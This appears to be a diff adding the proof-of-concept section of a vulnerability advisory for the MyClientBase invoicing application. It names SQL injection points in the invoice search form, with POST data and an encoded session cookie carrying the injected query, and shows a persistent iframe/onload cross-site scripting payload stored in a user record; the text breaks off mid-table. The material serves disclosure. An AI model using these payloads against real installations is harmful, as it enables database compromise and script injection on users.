@@ -1,0 +1,77 @@
+Proof of Concept:
+=================
+1.1
+The sql injection vulnerabilities can be exploited by remote attackers without user inter action. For demonstration or 
+reproduce ...
+
+URL:            http://www.example.com/myclientbase/index.php/invoice_search
+METHOD:         POST
+INJECTION TYPE: Order by --
+MODULE:         invoice# via invoice_number & tags
+
+Review: Vulnerable Input File
+<dl>
+<dt><label>Invoice #: </label></dt>
+<dd><input name="invoice_number" value="" type="text"></dd>
+</dl>
+... &
+<dl>
+<dt><label>Tags: </label></dt>
+<dd><input id="tags" name="tags" value="" type="text"></dd>
+</dl>
+
+PoC:
+POSTDATA=
+invoice_number=-1%27[SQL-Injection]&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=buh&output_type=index&btn_search=Search
+
+... or
+invoice_number=test&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=-1%27[SQL-Injection]&output_type=index&btn_search=Search
+
+
+ci_session=a%3A11%3A%7Bs%3A10%3A%22
+session_id%22%3Bs%3A32%3A%2248cebf507f1d7cbc8dd09fc127f16acb%22%3Bs%3A10%3A%22
+ip_address%22%3Bs%3A11%3A%2286.32.63.91%22%3Bs%3A10%3A%22
+user_agent%22%3Bs%3A50%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%3B+rv%3A11.0%29+Gecko%22%3Bs%3A13%3A%22
+last_activity%22%3Bi%3A1334351916%3Bs%3A7%3A%22
+user_id%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22
+last_name%22%3Bs%3A4%3A%22User%22%3Bs%3A10%3A%22
+first_name%22%3Bs%3A5%3A%22Admin%22%3Bs%3A12%3A%22
+global_admin%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22
+is_admin%22%3Bb%3A1%3Bs%3A10%3A%22
+last_index%22%3Bs%3A80%3A%22
+invoice_search%2Fsearch_results%2F
+index%2F
+search_hash%2F8389e50abcfbd64f85d756ed6ab0205e%22%3Bs%3A11%3A%22
+search_hash%22%3Ba%3A1%3A%7Bs%3A32%3A%228389e50abcfbd64f85d756ed6ab0205e%22%3Ba%3A2%3A%7Bs%3A5%3A%
+22where%22%3Ba%3A3%3A%7Bs%3A29%3A%22mcb_invoices.invoice_is_quote%22%3Bi%3A0%3Bi%3A0%3Bs%3A133%3A%22mcb_invoices.
+invoice_id+IN+%28SELECT+invoice_id+FROM+mcb_invoice_tags+WHERE+tag_id+IN+%28SELECT+tag_id+FROM+mcb_tags+WHERE+
+tag+IN%28%27-1%27%29%29%29%22%3Bi%3A1%3Bs%3A40%3A%22mcb_invoices.invoice_number+LIKE+%27%25-1%27%25%27%22%3B%7Ds
+%3A8%3A%22where_in%22%3Ba%3A1%3A%7Bs%3A22%3A%22mcb_invoices.client_id%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3B%
+7D%7D%7D%7D%7D4b78e5e505d94a46962e42792c6df0b8
+
+
+
+1.2
+The persistent input validation vulnerabilities can be exploited by remote attackers with low required user inter 
+action.
+For demonstration or reproduce ...
+
+Input URL:      http://www.example.com/myclientbase/index.php/users/form/user_id/2
+Affected URL:   http://www.example.com/myclientbase/index.php/users
+
+Review: user Accounts - Listing
+
+<table>
+<tbody><tr>
+                <th scope="col" class="first">ID</th>
+                <th scope="col">Name</th>
+                <th scope="col">Company Name</th>
+                <th scope="col">Email</th>
+                <th scope="col">Phone Number</th>
+                <th scope="col" class="last">Actions</th>
+                </tr>
+                        <tr>
+<td class="first">2</td>
+<td>"><iframe src="a" onload='alert("VulnerabilityLab")' <,="" "=""><
+iframe src=a onload=alert("VulnerabilityLab") <</td>
+                                        <td></t
